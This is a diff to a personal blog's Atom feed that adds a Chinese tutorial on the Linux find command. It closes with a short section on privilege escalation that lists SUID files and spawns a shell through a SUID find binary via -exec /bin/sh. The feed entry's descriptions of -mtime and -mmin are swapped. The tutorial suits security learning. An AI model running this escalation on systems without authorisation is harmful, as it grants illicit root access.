@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://hyled-Ava.github.io</id>
     <title>hyled-Ava</title>
-    <updated>2020-04-28T06:43:15.281Z</updated>
+    <updated>2020-04-29T11:27:46.617Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://hyled-Ava.github.io"/>
     <link rel="self" href="https://hyled-Ava.github.io/atom.xml"/>
@@ -10,6 +10,91 @@
     <logo>https://hyled-Ava.github.io/images/avatar.png</logo>
     <icon>https://hyled-Ava.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, hyled-Ava</rights>
+    <entry>
+        <title type="html"><![CDATA[find基础命令与提权教程]]></title>
+        <id>https://hyled-Ava.github.io/post/find-ji-chu-ming-ling-yu-ti-quan-jiao-cheng/</id>
+        <link href="https://hyled-Ava.github.io/post/find-ji-chu-ming-ling-yu-ti-quan-jiao-cheng/">
+        </link>
+        <updated>2020-04-29T11:26:06.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="find基础命令与提权教程">find基础命令与提权教程</h3>
+<blockquote>
+<p>find命令用来在指定目录下查找文件，若不指定目录则视为当前目录</p>
+</blockquote>
+<ol>
+<li><strong>find常用参数</strong></li>
+</ol>
+<blockquote>
+<p><strong>语法：find [path...] [expression]</strong></p>
+<p>path为查找路径，<code>.</code>为当前路径，<code>/</code>为根目录</p>
+<p>expression即为参数</p>
+<p><strong>-name：</strong> 按文件名查找文件</p>
+<p><strong>-perm：</strong> 按照文件权限来查找文件，4000，2000,1000为分别表示SUID,SGID,SBIT，如777为普通文件的最高权限，7000为特殊文件的最高权限</p>
+<p><strong>-user：</strong> 按照文件属主来查找</p>
+<p><strong>-size n：</strong> 文件大小是n个单位</p>
+<p><strong>-type：</strong></p>
+<ol>
+<li>d：目录</li>
+<li>f：文件</li>
+<li>c：字符设备文件</li>
+<li>b：块设备文件</li>
+</ol>
+<p><strong>-atime n：</strong> time表示日期，时间单位是day,查找系统最后<code>n*24</code>小时内曾被存取过的文件或目录</p>
+<p><strong>-amin n：</strong> 查找系统最后<code>n</code>分钟内曾被存取过的文件或目录</p>
+<p><strong>-ctime n:</strong> 查找系统中最后<code>n*24</code>小时内曾被改变文件状态(<strong>权限、所属组、位置......</strong>)的文件或目录</p>
+<p><strong>-cmin n:</strong> 查找系统中最后<code>N</code>分钟内曾被改变文件状态(<strong>权限、所属组、位置......</strong>)的文件或目录</p>
+<p><strong>-mtime:</strong> 查找系统中最后<code>N</code>分钟内曾被更改过的文件或目录</p>
+<p><strong>-mmin n:</strong> 查找系统中最后<code>n*24</code>小时内曾被更改过的文件或目录</p>
+<p><strong>-print：</strong> 将匹配的文件输出到标准输出</p>
+<p><strong>-exec：</strong> find命令对匹配的文件执行该参数所给出的shell命令。相应命令的形式为’command’ {  } ;，注意{   }和\；之间的空格。</p>
+</blockquote>
+<ol start="2">
+<li><strong>find实例</strong></li>
+</ol>
+<p>1.在当前目录下查找文件名以txt为后缀的文件</p>
+<pre><code>find -name '*.txt'
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/20200429182135238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDkxMjE2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>2.在root目录下查找大于50m小于100m的文件</p>
+<pre><code>find / -size +50M -size -100M -type f
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vaHlsZWQtQXZhL3dyaXRlX2ltYWdlL3Jhdy9tYXN0ZXIvMjAyMC9pbWFnZS0yMDIwMDQyOTE3Mjc0NTMyNC5wbmc?x-oss-process=image/format,png" alt="image-20200429172745324" loading="lazy"></figure>
+<p>3.查找在10分钟内读取过的文件</p>
+<pre><code>find / -amin 10 -type f 
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vaHlsZWQtQXZhL3dyaXRlX2ltYWdlL3Jhdy9tYXN0ZXIvMjAyMC9pbWFnZS0yMDIwMDQyOTE3NDkyMjUyMS5wbmc?x-oss-process=image/format,png" alt="image-20200429174922521" loading="lazy"></figure>
+<p>4.查找权限为777的文件或目录并排序</p>
+<pre><code>find -perm -777 -type f |sort
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vaHlsZWQtQXZhL3dyaXRlX2ltYWdlL3Jhdy9tYXN0ZXIvMjAyMC9pbWFnZS0yMDIwMDQyOTE3NTIyNDg0NS5wbmc?x-oss-process=image/format,png" alt="image-20200429175224845" loading="lazy"></figure>
+<p>5.查找当前目录下所有.txt文件并把他们拼接起来写入到all.txt文件中</p>
+<pre><code>find . -type f -name &quot;*.txt&quot; -exec cat {} \;&gt; all.txt
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vaHlsZWQtQXZhL3dyaXRlX2ltYWdlL3Jhdy9tYXN0ZXIvMjAyMC9pbWFnZS0yMDIwMDQyOTE3NTU0NjQzMC5wbmc?x-oss-process=image/format,png" alt="image-20200429175546430" loading="lazy"></figure>
+<p>6.因为单行命令中-exec参数中无法使用多个命令，以下方法可以实现在-exec之后接受多条命令</p>
+<pre><code>find '1.txt' -exec ./text.sh {} \;
+</code></pre>
+<p>text.sh内容</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vaHlsZWQtQXZhL3dyaXRlX2ltYWdlL3Jhdy9tYXN0ZXIvMjAyMC9pbWFnZS0yMDIwMDQyOTE4MDIyOTU0NS5wbmc?x-oss-process=image/format,png" alt="image-20200429180229545" loading="lazy"><br>
+命令结果<br>
+<img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vaHlsZWQtQXZhL3dyaXRlX2ltYWdlL3Jhdy9tYXN0ZXIvMjAyMC9pbWFnZS0yMDIwMDQyOTE4MDI0Nzg5NS5wbmc?x-oss-process=image/format,png" alt="image-20200429180247895" loading="lazy"></p>
+<ol start="3">
+<li><strong>find命令提权</strong></li>
+</ol>
+<p>1.使用find命令查看拥有suid权限的文件</p>
+<pre><code>find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vaHlsZWQtQXZhL3dyaXRlX2ltYWdlL3Jhdy9tYXN0ZXIvMjAyMC9pbWFnZS0yMDIwMDQyOTE4MDYwODkxNi5wbmc?x-oss-process=image/format,png" alt="image-20200429180608916" loading="lazy"><br>
+2.使用exec查看当前用户</p>
+<pre><code>find text -exec &quot;whoami&quot; \;
+</code></pre>
+<p>text必须是可以找到的文件名，不然会出错，可以看到是root权限，如果这里显示的不是可以接着看下一步</p>
+<figure data-type="image" tabindex="6"><img src="https://cdn.jsdelivr.net/gh/hyled-Ava/write_pictures/image_2020/20200429182453.png" alt="" loading="lazy"></figure>
+<p>3.使用find命令来提权</p>
+<pre><code>find text.sh -exec &quot;/bin/sh&quot; \;
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vaHlsZWQtQXZhL3dyaXRlX2ltYWdlL3Jhdy9tYXN0ZXIvMjAyMC9pbWFnZS0yMDIwMDQyOTE4MTEzNTUxMi5wbmc?x-oss-process=image/format,png" alt="image-20200429181135512" loading="lazy"></figure>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[grep + 正则表达式-实现高效查找]]></title>
         <id>https://hyled-Ava.github.io/post/grep-zheng-ze-biao-da-shi-shi-xian-gao-xiao-cha-zhao/</id>
